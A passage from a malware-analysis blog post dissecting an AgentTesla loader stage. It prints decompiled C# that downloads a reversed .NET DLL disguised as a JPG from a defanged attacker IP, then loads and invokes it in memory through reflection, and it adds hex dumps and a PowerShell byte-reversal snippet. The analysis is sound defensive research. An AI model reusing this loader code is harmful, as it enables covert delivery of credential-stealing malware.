    <span class="n">AppDomain</span><span class="p">.</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="nf">Load</span><span class="p">(</span><span class="n">list</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">());</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Within the function there is immediately some interesting code. First, there is a <code class="language-plaintext highlighter-rouge">byte[]</code> array that holds content from <code class="language-plaintext highlighter-rouge">Class2.smethod_0()</code> byte arrays in malware tend to include string or binary content, so my hypothesis for the array is that is designed to hold one of those. The code then manipulates a Stack object, pushing objects onto it. It doesn’t seem to use them in a productive way outside a subsequent <code class="language-plaintext highlighter-rouge">Console.WriteLine</code> call. The byte array does get used, in a reversal algorithm. The <code class="language-plaintext highlighter-rouge">num</code> variable and following <code class="language-plaintext highlighter-rouge">while</code> loop starts with the ending element of the byte array and moves backward to the first, adding each element to a list. After the reversal, the list gets converted back to an array and used as a parameter for <a href="https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-6.0#system-appdomain-load(system-byte())"><code class="language-plaintext highlighter-rouge">AppDomain.CurrentDomain.Load()</code></a>. This call is designed to load an arbitrary .NET assembly into the current application domain. This is roughly similar to <code class="language-plaintext highlighter-rouge">System.Reflection.Assembly.Load()</code>. This adds some credence to our hypothesis from earlier, that the byte array will likely hold binary content that translates into an assembly. So let’s pivot over to that function to see what it does.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">internal</span> <span class="k">class</span> <span class="nc">Class2</span> <span class="p">:</span> <span class="n">Process</span>
<span class="p">{</span>
<span class="k">internal</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="nf">smethod_0</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">string</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">string</span><span class="p">[</span><span class="m">3</span><span class="p">]</span>
    <span class="p">{</span>
        <span class="s">"Dot"</span><span class="p">,</span>
        <span class="s">"Net"</span><span class="p">,</span>
        <span class="s">"Perls"</span>
    <span class="p">};</span>
    <span class="n">Stack</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">val</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Stack</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;((</span><span class="n">IEnumerable</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;)</span><span class="n">array</span><span class="p">);</span>
    <span class="n">Enumerator</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">enumerator</span> <span class="p">=</span> <span class="n">val</span><span class="p">.</span><span class="nf">GetEnumerator</span><span class="p">();</span>
    <span class="k">try</span>
    <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">enumerator</span><span class="p">.</span><span class="nf">MoveNext</span><span class="p">())</span>
        <span class="p">{</span>
            <span class="kt">string</span> <span class="n">current</span> <span class="p">=</span> <span class="n">enumerator</span><span class="p">.</span><span class="nf">get_Current</span><span class="p">();</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">finally</span>
    <span class="p">{</span>
        <span class="p">((</span><span class="n">IDisposable</span><span class="p">)</span><span class="n">enumerator</span><span class="p">).</span><span class="nf">Dispose</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">Class1</span><span class="p">.</span><span class="nf">smethod_2</span><span class="p">(</span><span class="s">"hxxp://18.179.111[.]240/xr0/loader/uploads/scan08710203065_Kvnllpaf.jpg"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Most of the code in this function is either junk or imposes a slight delay before further execution. The only real important code in the function is the last line that calls <code class="language-plaintext highlighter-rouge">Class1.smethod_2()</code>, passing in a URL to an alleged JPG file. We know this function is supposed to return a byte array to get reversed and loaded into memory, so there’s a decent chance this upcoming code performs a download of a reversed Windows EXE or DLL. Let’s jump to that code:</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="nf">smethod_2</span><span class="p">(</span><span class="kt">string</span> <span class="n">string_0</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">using</span> <span class="nn">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">();</span>
    <span class="n">WebRequest</span> <span class="n">val</span> <span class="p">=</span> <span class="n">WebRequest</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="n">string_0</span><span class="p">);</span>
    <span class="n">Stream</span> <span class="n">responseStream</span> <span class="p">=</span> <span class="n">val</span><span class="p">.</span><span class="nf">GetResponse</span><span class="p">().</span><span class="nf">GetResponseStream</span><span class="p">();</span>
    <span class="n">responseStream</span><span class="p">.</span><span class="nf">CopyTo</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">memoryStream</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Sure enough, the method creates a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webrequest?view=net-6.0">WebRequest</a> object for the URL, passes its response into a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.io.memorystream?view=net-6.0">MemoryStream</a>, and returns the content as a byte array. This function ends the second branch of code from <code class="language-plaintext highlighter-rouge">Main()</code>, and we can dive into the final function from <code class="language-plaintext highlighter-rouge">Main()</code> here:</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">internal</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">smethod_1</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">Assembly</span><span class="p">[]</span> <span class="n">assemblies</span> <span class="p">=</span> <span class="n">AppDomain</span><span class="p">.</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="nf">GetAssemblies</span><span class="p">();</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="n">Assembly</span> <span class="n">assembly</span> <span class="k">in</span> <span class="n">assemblies</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">Type</span><span class="p">[]</span> <span class="n">types</span> <span class="p">=</span> <span class="n">assembly</span><span class="p">.</span><span class="nf">GetTypes</span><span class="p">();</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="n">Type</span> <span class="n">type</span> <span class="k">in</span> <span class="n">types</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">try</span>
            <span class="p">{</span>
                <span class="n">Queue</span><span class="p">&lt;</span><span class="kt">int</span><span class="p">&gt;</span> <span class="n">val</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Queue</span><span class="p">&lt;</span><span class="kt">int</span><span class="p">&gt;();</span>
                <span class="n">val</span><span class="p">.</span><span class="nf">Enqueue</span><span class="p">(</span><span class="m">10</span><span class="p">);</span>
                <span class="n">val</span><span class="p">.</span><span class="nf">Enqueue</span><span class="p">(</span><span class="m">23</span><span class="p">);</span>
                <span class="n">val</span><span class="p">.</span><span class="nf">Enqueue</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">type</span><span class="p">.</span><span class="nf">InvokeMember</span><span class="p">(</span><span class="s">"Zsjeajjr"</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">InvokeMethod</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">));</span>
                <span class="n">val</span><span class="p">.</span><span class="nf">Enqueue</span><span class="p">(</span><span class="m">5</span><span class="p">);</span>
                <span class="n">val</span><span class="p">.</span><span class="nf">Enqueue</span><span class="p">(</span><span class="m">29</span><span class="p">);</span>
                <span class="n">Enumerator</span><span class="p">&lt;</span><span class="kt">int</span><span class="p">&gt;</span> <span class="n">enumerator</span> <span class="p">=</span> <span class="n">val</span><span class="p">.</span><span class="nf">GetEnumerator</span><span class="p">();</span>
                <span class="k">try</span>
                <span class="p">{</span>
                    <span class="k">while</span> <span class="p">(</span><span class="n">enumerator</span><span class="p">.</span><span class="nf">MoveNext</span><span class="p">())</span>
                    <span class="p">{</span>
                        <span class="kt">int</span> <span class="n">current</span> <span class="p">=</span> <span class="n">enumerator</span><span class="p">.</span><span class="nf">get_Current</span><span class="p">();</span>
                        <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="p">...</span>
</pre></table></code></div></div><p>I’ve gone ahead and left out some of the function code for brevity, the important bits are shown above. For each class/type in each assembly namespace in this application domain, the code searches for a method named <code class="language-plaintext highlighter-rouge">Zsjeajjr()</code>. Once found, the method gets invoked and control is passed to that method.</p><p>Now we can explore that <code class="language-plaintext highlighter-rouge">scan08710203065_Kvnllpaf.jpg</code> file downloaded and loaded!</p><h2 id="analyzing-scan08710203065_kvnllpafjpg"><span class="me-2">Analyzing scan08710203065_Kvnllpaf.jpg</span><a href="#analyzing-scan08710203065_kvnllpafjpg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>From the previous stage we know this file should contain the bytes of a Windows EXE or DLL that are reversed. Our typical <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">diec</code> commands won’t work because the first bytes of the file will presumably be zeroes. We can use <code class="language-plaintext highlighter-rouge">xxd</code> and <code class="language-plaintext highlighter-rouge">tail</code> to see the file contents.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>xxd scan08710203065_Kvnllpaf.jpg | <span class="nb">tail</span>
<span class="go">00095760: 0009 5000 0006 010b 210e 00e0 0000 0000  ..P.....!.......
00095770: 0000 0000 623c f3a6 0003 014c 0000 4550  ....b&lt;.....L..EP
</span><span class="gp">00095780: 0000 0000 0000 0024 0a0d 0d2e 6564 6f6d  .......$</span>....edom
<span class="go">00095790: 2053 4f44 206e 6920 6e75 7220 6562 2074   SOD ni nur eb t
000957a0: 6f6e 6e61 6320 6d61 7267 6f72 7020 7369  onnac margorp si
000957b0: 6854 21cd 4c01 b821 cd09 b400 0eba 1f0e  hT!.L..!........
000957c0: 0000 0080 0000 0000 0000 0000 0000 0000  ................
000957d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000957e0: 0000 0000 0000 0040 0000 0000 0000 00b8  .......@........
000957f0: 0000 ffff 0000 0004 0000 0003 0090 5a4d  ..............ZM
</span></pre></table></code></div></div><p>Excellent, we have a MZ header and DOS stub reversed in the file bytes. We can easily get the original order using PowerShell code:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-AsByteStream</span><span class="w"> </span><span class="o">.</span><span class="nx">/scan08710203065_Kvnllpaf.jpg</span><span class="w">
</span><span class="p">[</span><span class="n">Array</span><span class="p">]::</span><span class="n">Reverse</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="w">
</span><span class="n">Set-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">/original.bin</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$code</span><span class="w"> </span><span class="nt">-AsByteStream</span><span class="w">
</span></pre></table></code></div></div><p>Now we can examine the original binary file to see the next steps.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>diec original.bin 
<span class="go">PE32
    Protector: Eziriz .NET Reactor(6.x.x.x)[By Dr.FarFar]
    Library: .NET(v4.0.30319)[-]
    Linker: Microsoft Linker(6.0)[DLL32]

</span><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>file original.bin 
<span class="go">original.bin: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
</span></pre></table></code></div></div><p>Once again, this stage looks to be a .NET DLL packed using <a href="https://www.eziriz.com/">.NET Reactor</a>, another commercial obfuscator. This is where I want to stop for the evening because when I tried to move into subsequent stages I was stumped by some of the obfuscation and the amount of code in this original DLL. I leave its deobfuscation and decompilation up to the reader as further work if desired, and the sample is available in MalwareBazaar here: <a href="https://bazaar.abuse.ch/sample/5250352cea9441dd051802bd58ccc6b2faf05007ee599e6876b9cce3fdc5aa26/">https://bazaar.abuse.ch/sample/5250352cea9441dd051802bd58ccc6b2faf05007ee599e6876b9cce3fdc5aa26/</a>.</p><p>Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/malware/">malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/agenttesla/" class="post-tag no-text-decoration" >agenttesla</a> <a href="/tags/macro/" class="post-tag no-text-decoration" >macro</a> <a href="/tags/certutil/" class="post-tag no-text-decoration" >certutil</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=An%20AgentTesla%20Sample%20Using%20VBA%20Macros%20and%20Certutil%20-%20Tony%20Lambert&url=https%3A%2F%2Fforensicitguy.github.io%2Fagenttesla-vba-certutil-download%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=An%20AgentTesla%20Sample%20Using%20VBA%20Macros%20and%20Certutil%20-%20Tony%20Lambert&u=https%3A%2F%2Fforensicitguy.github.io%2Fagenttesla-vba-certutil-download%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fforensicitguy.github.io%2Fagenttesla-vba-certutil-download%2F&text=An%20AgentTesla%20Sample%20Using%20VBA%20Macros%20and%20Certutil%20-%20Tony%20Lambert" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fforensicitguy.github.io%2Fagenttesla-vba-certutil-download%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <script defer type="module" src="https://cdn.jsdelivr.net/npm/@justinribeiro/share-to-mastodon/+esm"></script> <button class="btn text-start" data-bs-toggle="tooltip" data-bs-placement="top" title="Mastodon" aria-label="Mastodon"> <share-to-mastodon class="share-mastodon" message="An%20AgentTesla%20Sample%20Using%20VBA%20Macros%20and%20Certutil%20-%20Tony%20Lambert" url="https%3A%2F%2Fforensicitguy.github.io%2Fagenttesla-vba-certutil-download%2F"customInstanceList="[{&quot;label&quot;:&quot;mastodon.social&quot;,&quot;link&quot;:&quot;https://mastodon.social/&quot;},{&quot;label&quot;:&quot;mastodon.online&quot;,&quot;link&quot;:&quot;https://mastodon.online/&quot;},{&quot;label&quot;:&quot;fosstodon.org&quot;,&quot;link&quot;:&quot;https://fosstodon.org/&quot;},{&quot;label&quot;:&quot;infosec.exchange&quot;,&quot;link&quot;:&quot;https://infosec.exchange/&quot;}]" > <i class="fa-fw fa-brands fa-mastodon"></i> </share-to-mastodon> </button> <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fforensicitguy.github.io%2Fagenttesla-vba-certutil-download%2F&title=An%20AgentTesla%20Sample%20Using%20VBA%20Macros%20and%20Certutil%20-%20Tony%20Lambert" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit"> <i class="fa-fw fa-brands fa-square-reddit"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/decompiling-jphp-loader-binwalk-cfr/">Decompiling a JPHP Loader with binwalk and cfr</a><li class="text-truncate lh-lg"> <a href="/dissecting-java-pikabot-dropper/">Dissecting a Java Pikabot Dropper</a><li class="text-truncate lh-lg"> <a href="/timelining-malware-vhd-intelligence/">Timelining a Malicious VHD for More Intelligence</a><li class="text-truncate lh-lg"> <a href="/vhd-malware-an-excellent-choice/">Malware via VHD Files, an Excellent Choice</a><li class="text-truncate lh-lg"> <a href="/faster-malware-triage-yara/">Faster Malware Triage with YARA</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/msi/">msi</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag btn btn-outline-primary" href="/tags/jar/">jar</a> <a class="post-tag btn btn-outline-primary" href="/tags/java/">java</a> <a class="post-tag btn btn-outline-primary" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag btn btn-outline-primary" href="/tags/mshta/">mshta</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.net</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/a-tale-of-two-dropper-scripts/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1641168000" data-df="ll" > Jan 3, 2022 </time><h4 class="pt-0 my-2">A Tale of Two Dropper Scripts for Agent Tesla</h4><div class="text-muted"><p>In this post I want to look at two script files that drop Agent Tesla stealers on affected systems and show how adversary decisions affect malware analysis and detection. If you want to follow alon...</p></div></div></a></article><article class="col"> <a href="/aggah-ppam-renamed-mshta/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1646352000" data-df="ll" > Mar 4, 2022 </time><h4 class="pt-0 my-2">Aggah PPAM macros renaming MSHTA</h4><div class="text-muted"><p>In this quick post I’m taking a look at a PowerPoint file with macros on board! According to MalwareBazaar’s tags, it was reported in association with the group “Aggah”. If you want to follow along...</p></div></div></a></article><article class="col"> <a href="/agenttesla-rtf-dotnet-tradecraft/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1644105600" data-df="ll" > Feb 6, 2022 </time><h4 class="pt-0 my-2">AgentTesla From RTF Exploitation to .NET Tradecraft</h4><div class="text-muted"><p>When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from som...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/formbook-via-vbs-powershell-and-csharp/" class="btn btn-outline-primary" aria-label="Older" ><p>Formbook Distributed Via VBScript, PowerShell, and C# Code</p></a> <a href="/snip3-crypter-dcrat-vbs/" class="btn btn-outline-primary" aria-label="Newer" ><p>Snip3 Crypter used with DCRat via VBScript</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/msi/">msi</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag btn btn-outline-primary" href="/tags/jar/">jar</a> <a class="post-tag btn btn-outline-primary" href="/tags/java/">java</a> <a class="post-tag btn btn-outline-primary" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag btn btn-outline-primary" href="/tags/mshta/">mshta</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.net</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.29.0/dist/tocbot.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener('DOMContentLoaded', function (event) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
